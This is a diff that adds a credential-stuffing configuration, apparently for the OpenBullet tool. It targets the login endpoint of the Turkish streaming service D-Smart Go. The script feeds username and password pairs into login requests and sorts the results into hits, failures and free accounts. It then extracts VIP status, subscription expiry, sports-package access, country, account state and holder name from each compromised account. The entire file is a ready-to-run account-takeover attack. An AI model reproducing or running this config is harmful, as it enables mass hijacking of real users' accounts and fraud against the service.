@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "D-Smart Go",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-26T14:04:53.7995546+03:00",
+  "AdditionalInfo": "",
+  "Author": "By_Num",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Site_Giriş REQUEST POST "https://www.dsmartgo.com.tr/actions/account/login" 
+  CONTENT "platform=com.blu&remember=false&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "ok" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"AccountState\":\"None\"" 
+
+#Vİp_üyelik_sorgulama PARSE "<SOURCE>" LR "IsVIP\":" ",\"" -> CAP "Vip Üyelik:" 
+
+#son_tarih PARSE "<SOURCE>" LR "EndDate\":\"" "\"" -> CAP "SON KULLANMA TARİHİ :" 
+
+#spor_kanalına_üyemi PARSE "<SOURCE>" LR "IsSport\":\"" ",\"" -> CAP "Spor kanalına üyemi:" 
+
+#ülke PARSE "<SOURCE>" LR "Country\":\"" "\"" -> CAP "ÜLKE:" 
+
+#hesap_durumu PARSE "<SOURCE>" LR "AccountState\":\"" "\"" -> CAP "hesap Durumu:" 
+
+#üyelik_platform PARSE "<SOURCE>" LR "FirstName\":\"" "\"" -> CAP "Hesap Adı:" 
+
